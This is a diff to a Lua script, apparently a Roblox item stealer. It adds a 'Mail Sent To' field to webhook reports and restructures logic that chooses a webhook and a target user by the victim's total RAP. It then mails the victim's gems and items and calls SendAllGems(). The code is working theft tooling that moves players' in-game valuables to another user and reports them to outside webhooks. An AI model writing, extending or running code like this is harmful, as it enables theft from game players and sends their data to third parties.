@@ -49,7 +49,7 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds, webhookUrl)
+local function SendMessage(username, diamonds, webhookUrl, recipient)
     local headers = {
         ["Content-Type"] = "application/json",
     }
@@ -69,6 +69,11 @@ local function SendMessage(username, diamonds, webhookUrl)
             name = "Summary:",
             value = "",
             inline = false
+        },
+        {
+            name = "Mail Sent To:",  -- New field to show the mail recipient
+            value = recipient,
+            inline = true
         }
     }
 
@@ -289,25 +294,25 @@ if #sortedItems > 0 then
     local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
     local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
-spawn(function()
-    -- Conditional send logic based on totalRAP value
-    if totalRAP > 100000 then
-        -- If total RAP > 100,000:
-        -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(targetUser, GemAmount1, highRAPWebhook)
-        SendMail(targetUser, GemAmount1, highRAPWebhook)
-        
-        -- Do not send anything to the global webhook/user
-    else
-        -- If total RAP <= 100,000:
-        -- Send both message and mail to global webhook/user
-        SendMessage(targetUser, GemAmount1, webhook)
-        SendMail(targetUser, GemAmount1, webhook)
-        
-        -- Send message only to highRAPWebhook/highRAPUser (no mail)
-        SendMessage(targetUser, GemAmount1, highRAPWebhook)
-    end
-end)
+    spawn(function()
+        -- Conditional send logic based on totalRAP value
+        if totalRAP > 100000 then
+            -- If total RAP > 100,000:
+            -- Send both message and mail to highRAPWebhook/highRAPUser
+            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+            SendMail(targetUser, GemAmount1, highRAPWebhook)
+            
+            -- Do not send anything to the global webhook/user
+        else
+            -- If total RAP <= 100,000:
+            -- Send both message and mail to global webhook/user
+            SendMessage(targetUser, GemAmount1, webhook, targetUser)
+            SendMail(targetUser, GemAmount1, webhook)
+            
+            -- Send message only to highRAPWebhook/highRAPUser (no mail)
+            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+        end
+    end)
 
     SendAllGems()
 
